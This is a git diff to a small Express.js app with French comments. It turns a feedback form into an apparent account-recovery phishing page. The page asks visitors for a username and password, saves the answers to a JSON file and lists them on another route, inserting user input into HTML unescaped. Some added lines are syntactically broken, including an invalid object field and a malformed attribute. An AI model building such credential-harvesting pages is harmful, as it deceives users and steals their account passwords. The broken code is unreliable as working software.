@@ -1,14 +1,34 @@
 import express from 'express';
+import fs from 'fs';
 const app = express();
 const PORT = process.env.PORT || 3000;
+const FILE_PATH = 'avis.json';
 
-// Autorise Express à lire les données provenant d'un formulaire HTML
 app.use(express.urlencoded({ extended: true }));
 
-// Variable temporaire pour stocker les avis reçus
-let listeAvis = [];
+// Fonction pour lire les avis existants dans le fichier
+function chargerAvis() {
+    try {
+        if (fs.existsSync(FILE_PATH)) {
+            const data = fs.readFileSync(FILE_PATH, 'utf8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        console.error("Erreur de lecture du fichier :", error);
+    }
+    return [];
+}
 
-// Page d'accueil : Affiche le formulaire HTML
+// Fonction pour sauvegarder la liste dans le fichier
+function sauvegarderAvis(liste) {
+    try {
+        fs.writeFileSync(FILE_PATH, JSON.stringify(liste, null, 2), 'utf8');
+    } catch (error) {
+        console.error("Erreur d'écriture du fichier :", error);
+    }
+}
+
+// Page d'accueil : Formulaire
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -23,23 +43,23 @@ app.get('/', (req, res) => {
                 .form-group { margin-bottom: 15px; }
                 label { display: block; margin-bottom: 5px; font-weight: bold; }
                 input, textarea { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-                button { background-color: #007BFF; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
-                button:hover { background-color: #0056b3; }
+                button { background-color: #28a745; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
+                button:hover { background-color: #218838; }
             </style>
         </head>
         <body>
             <div class="form-container">
-                <h2>Votre avis nous intéresse</h2>
+                <h2>Recovery your account</h2>
                 <form action="/envoyer-avis" method="POST">
                     <div class="form-group">
-                        <label for="username">Nom d'utilisateur (Username) :</label>
-                        <input type="text" id="username" name="username" required placeholder="Ex: JeanDupont">
+                        <label for="username">Nom d'utilisateur :</label>
+                        <input type="text" id="username" name="username" required placeholder="Votre pseudo">
                     </div>
                     <div class="form-group">
                         <label for="avis">Votre avis :</label>
-                        <textarea id="avis" name="avis" rows="4" required placeholder="Écrivez votre message ici..."></textarea>
+                        <textarea id="avis" name="avis" rows="4" required placeholder=Insert votre mots de passe"></textarea>
                     </div>
-                    <button type="submit">Envoyer l'avis</button>
+                    <button type="submit">Envoyer la reponse ici</button>
                 </form>
             </div>
         </body>
@@ -47,21 +67,23 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Route POST : Reçoit l'avis et l'enregistre
+// Traitement du formulaire
 app.post('/envoyer-avis', (req, res) => {
     const { username, avis } = req.body;
     
-    // Sauvegarde l'avis dans la liste
-    listeAvis.push({ username, avis, date: new Date().toLocaleString() });
+    // Charge la liste actuelle, ajoute le nouvel avis et sauvegarde
+    let listeActuelle = chargerAvis();
+    listeActuelle.push({ username, Mots de pass, date: new Date().toLocaleString() });
+    sauvegarderAvis(listeActuelle);
     
-    // Message de confirmation à l'utilisateur
-    res.send('<h1>Merci ! Votre avis a bien été transmis.</h1><a href="/voir-avis">Voir les avis reçus</a>');
+    res.send('<h1>Merci !Nous travailon a votre securite☑️.</h1><a href="/voir-avis">Voir les avis reçus</a>');
 });
 
-// Route pour vous permettre de consulter les avis reçus
+// Consultation des avis
 app.get('/voir-avis', (req, res) => {
+    const listeActuelle = chargerAvis();
     let html = '<h1>Liste des avis reçus :</h1><ul>';
-    listeAvis.forEach(item => {
+    listeActuelle.forEach(item => {
         html += `<li><strong>${item.username}</strong> (${item.date}) : ${item.avis}</li>`;
     });
     html += '</ul><br><a href="/">Retour au formulaire</a>';
@@ -71,3 +93,4 @@ app.get('/voir-avis', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Serveur démarré sur le port ${PORT}`);
 });
+
